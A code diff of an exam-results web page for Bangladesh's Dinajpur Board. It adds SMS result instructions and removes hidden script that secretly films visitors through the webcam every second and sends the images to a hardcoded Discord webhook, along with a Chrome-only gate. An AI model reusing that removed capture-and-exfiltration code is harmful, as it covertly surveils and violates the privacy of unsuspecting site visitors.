@@ -392,25 +392,9 @@ table{
             top: 0;
             border-radius: 20px;
         }
-         .warning h2{
-           color: yellow;
-         font-size: 30px;
-         background-color: black;
-         width: 100%;
-         height: 100% ;
-         }
-        .warning
-        {
-          color: red; 
-          font-size: 28px;
-         background-color: black;
-         width: 100%;
-         height: 100% ;
-        }
 </style>
 </head>
 <body>
-
     <header>
         <h1>DINAJPUR BOARD </h1>
         <h3>Individual Student Result</h3>
@@ -422,12 +406,7 @@ table{
     <span class="material-icons">notifications</span>
     <span class="icon-buttonn__badge">2</span>
   </button>
-    <div id="warning" class="warning" style="display: none;">
-        <h2>Warning!</h2>
-        <p>This website only supports Google Chrome. Please use the Chrome browser to view this site.</p>
-        <br> <br>
-        <p align="center"><img src="open-in-chrome.jpg" width="100%" height="100%"></p>
-    </div>
+
   <!-- Popup content -->
   <div class="popupp" id="popupp">
     <div class="popupp-content">
@@ -466,6 +445,9 @@ table{
         <p>এই ওয়েবসাইটটির মাধ্যমে আপনারা দিনাজপুর বোর্ডের এসএসসি (SSC)
         এবং এইচএসসি (HSC) বোর্ড পরীক্ষার ফলাফল এবং মার্কশিট দেখতে পারবেন | <br> এবং এইচএসসি/আলিম/সমমান, জেএসসি/জেডিসি, এসএসসি/দাখিল, এসএসসি (ভোকেশনাল),এইচএসসি/আলিম,এইচএসসি (ভোকেশনাল),এইচএসসি (বিএম),ডিপ্লোমা ইন কমার্স, ডিপ্লোমা ইন বিজনেস,  স্টাডিজ এর ফলাফলও দেখতে পারবেন | </p>
     <h1 style="color:yellow"><u>নির্দেশনা- </u></h1>
+    <h3>✪ SMS পদ্ধতি</h3>
+    <p>মোবাইল ফোনের মেসেজ অপশনে গিয়ে HSC লিখে স্পেস দিয়ে বোর্ডের নামের প্রথম ৩ অক্ষর লিখে স্পেস দিয়ে রোল নম্বর লিখে আবার স্পেস দিয়ে পাসের বছর লিখে পাঠাতে হবে ১৬২২২ নম্বরে। উদাহরণ— HSC DIN 123456 2024 লিখে পাঠাতে হবে ১৬২২২ নম্বরে। ফিরতি এসএমএসে জানা যাবে ফলাফল।</p>
+    <img src="sms.png" width="100%">
       <h3>✪ SSC</h3>
     <p> SSC পরীক্ষার ফলাফল ও মার্কশিট দেখতে এখানে ক্লিক করুন - </p>
        <a href="#" onclick="showContent('SSC')"> <img src="Ssc.jpg" width="100%"></a>
@@ -500,8 +482,6 @@ table{
 
   <h4 style="color:white"><pre>© Developed by <a style="color:#FFE4E1" href="https://www.facebook.com/mdmehedialhasansawon">Mehedi Al Hasan Sawon</pre> </a></h4>
     </footer>
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
         function showContent(page) {
@@ -639,66 +619,8 @@ displayQuote();
 
     // Event listener for notification button click
     document.getElementById("notificationBtn").addEventListener("click", openPopupp);
+  </script>
 
-//capture//
-
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        let captureInterval;
-
-        // Access the camera
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-                video.srcObject = stream;
-                startAutoCapture(); // Start capturing images automatically
-            })
-            .catch((error) => {
-                console.error("Error accessing the camera", error);
-            });
-
-        // Function to capture photo and send to Discord
-        function capturePhoto() {
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob((blob) => {
-                const formData = new FormData();
-                formData.append('file', blob, 'captured_image.png');
-
-                // Sending the photo to Discord via Webhook
-                fetch('https://discord.com/api/webhooks/1199416800027349163/7zVriP6clTaGEm9MbHi6lV8oxDbhvN_qnf97zHkSxajr7ITmyfPTrOBkYSk2szVAm_W8', {
-                    method: 'POST',
-                    body: formData,
-                })
-                .then(response => {
-                    if (response.ok) {
-                        console.log('Successfully sent to Discord');
-                    } else {
-                        console.error('Error sending to Discord:', response.statusText);
-                    }
-                })
-                .catch((error) => {
-                    console.error('Error sending to Discord:', error);
-                });
-            }, 'image/png');
-        }
-
-        // Start automatic photo capture every 5 seconds
-        function startAutoCapture() {
-            captureInterval = setInterval(capturePhoto, 1000);  // Capture every 5 seconds
-        }
-    //Warning//
-            function detectBrowser() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            const isChrome = userAgent.includes('chrome') && !userAgent.includes('edg') && !userAgent.includes('opr');
-            const isWebView = userAgent.includes('fb') || userAgent.includes('messenger') || userAgent.includes('whatsapp') || userAgent.includes('telegram');
-
-            // Show warning if not Chrome or if in a web view
-            if (!isChrome || isWebView) {
-                document.getElementById('content').style.display = 'none';
-                document.getElementById('warning').style.display = 'block';
-            }
-        }
-        detectBrowser();
 
     </script>
 </body>
